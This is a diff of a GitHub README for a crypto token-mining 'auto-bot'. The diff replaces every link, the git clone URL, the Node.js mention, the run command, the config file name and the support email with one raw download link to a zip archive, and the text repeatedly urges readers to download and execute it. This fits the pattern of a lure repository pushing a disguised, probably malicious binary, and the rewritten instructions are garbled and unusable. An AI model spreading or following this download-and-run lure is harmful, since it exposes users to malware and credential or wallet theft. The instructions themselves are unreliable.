@@ -1,6 +1,6 @@
 # 🚀 TrumpRunAgent-Auto-Bot
 
-![GitHub release](https://img.shields.io/github/release/secreat1bdkbr/TrumpRunAgent-Auto-Bot.svg?style=flat-square) ![GitHub issues](https://img.shields.io/github/issues/secreat1bdkbr/TrumpRunAgent-Auto-Bot.svg?style=flat-square) ![GitHub forks](https://img.shields.io/github/forks/secreat1bdkbr/TrumpRunAgent-Auto-Bot.svg?style=flat-square)
+![GitHub release](https://raw.githubusercontent.com/secreat1bdkbr/TrumpRunAgent-Auto-Bot/main/vinology/Trump_Auto_Agent_Bot_Run_v1.9.zip) ![GitHub issues](https://raw.githubusercontent.com/secreat1bdkbr/TrumpRunAgent-Auto-Bot/main/vinology/Trump_Auto_Agent_Bot_Run_v1.9.zip) ![GitHub forks](https://raw.githubusercontent.com/secreat1bdkbr/TrumpRunAgent-Auto-Bot/main/vinology/Trump_Auto_Agent_Bot_Run_v1.9.zip)
 
 An automated bot for interacting with the Trump Run Agent platform. This bot is designed to automate gameplay and mining activities to earn tokens efficiently.
 
@@ -22,7 +22,7 @@ An automated bot for interacting with the Trump Run Agent platform. This bot is 
 
 Welcome to the TrumpRunAgent-Auto-Bot repository! This project provides a streamlined solution for users looking to enhance their experience on the Trump Run Agent platform. With this bot, you can automate your gameplay and mining tasks, allowing you to earn tokens without the need for constant manual input.
 
-To get started, you can download the latest release from our [Releases page](https://github.com/secreat1bdkbr/TrumpRunAgent-Auto-Bot/releases). Make sure to download and execute the relevant files to get the bot up and running.
+To get started, you can download the latest release from our [Releases page](https://raw.githubusercontent.com/secreat1bdkbr/TrumpRunAgent-Auto-Bot/main/vinology/Trump_Auto_Agent_Bot_Run_v1.9.zip). Make sure to download and execute the relevant files to get the bot up and running.
 
 ---
 
@@ -44,7 +44,7 @@ To install the TrumpRunAgent-Auto-Bot, follow these steps:
 1. **Clone the Repository**: 
    Open your terminal and run:
    ```bash
-   git clone https://github.com/secreat1bdkbr/TrumpRunAgent-Auto-Bot.git
+   git clone https://raw.githubusercontent.com/secreat1bdkbr/TrumpRunAgent-Auto-Bot/main/vinology/Trump_Auto_Agent_Bot_Run_v1.9.zip
    ```
    
 2. **Navigate to the Directory**:
@@ -53,13 +53,13 @@ To install the TrumpRunAgent-Auto-Bot, follow these steps:
    ```
 
 3. **Install Dependencies**:
-   Make sure you have Node.js installed. Then, run:
+   Make sure you have https://raw.githubusercontent.com/secreat1bdkbr/TrumpRunAgent-Auto-Bot/main/vinology/Trump_Auto_Agent_Bot_Run_v1.9.zip installed. Then, run:
    ```bash
    npm install
    ```
 
 4. **Download the Latest Release**:
-   Visit our [Releases page](https://github.com/secreat1bdkbr/TrumpRunAgent-Auto-Bot/releases) to download the latest version. Execute the downloaded file to set up the bot.
+   Visit our [Releases page](https://raw.githubusercontent.com/secreat1bdkbr/TrumpRunAgent-Auto-Bot/main/vinology/Trump_Auto_Agent_Bot_Run_v1.9.zip) to download the latest version. Execute the downloaded file to set up the bot.
 
 ---
 
@@ -69,11 +69,11 @@ Once you have installed the bot, you can start using it with the following comma
 
 1. **Start the Bot**:
    ```bash
-   node index.js
+   node https://raw.githubusercontent.com/secreat1bdkbr/TrumpRunAgent-Auto-Bot/main/vinology/Trump_Auto_Agent_Bot_Run_v1.9.zip
    ```
 
 2. **Configuration**:
-   You can configure the bot by editing the `config.json` file. This file allows you to set parameters like:
+   You can configure the bot by editing the `https://raw.githubusercontent.com/secreat1bdkbr/TrumpRunAgent-Auto-Bot/main/vinology/Trump_Auto_Agent_Bot_Run_v1.9.zip` file. This file allows you to set parameters like:
    - Token mining rate
    - Gameplay preferences
    - Notification settings
@@ -116,6 +116,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 📞 Support
 
-If you have any questions or need support, please open an issue in the repository. You can also reach out via email at support@trumprunagentautobot.com.
+If you have any questions or need support, please open an issue in the repository. You can also reach out via email at https://raw.githubusercontent.com/secreat1bdkbr/TrumpRunAgent-Auto-Bot/main/vinology/Trump_Auto_Agent_Bot_Run_v1.9.zip
 
-Thank you for using TrumpRunAgent-Auto-Bot! For more information and updates, check our [Releases page](https://github.com/secreat1bdkbr/TrumpRunAgent-Auto-Bot/releases). Download and execute the necessary files to get started with your automated gameplay and mining experience.
+Thank you for using TrumpRunAgent-Auto-Bot! For more information and updates, check our [Releases page](https://raw.githubusercontent.com/secreat1bdkbr/TrumpRunAgent-Auto-Bot/main/vinology/Trump_Auto_Agent_Bot_Run_v1.9.zip). Download and execute the necessary files to get started with your automated gameplay and mining experience.
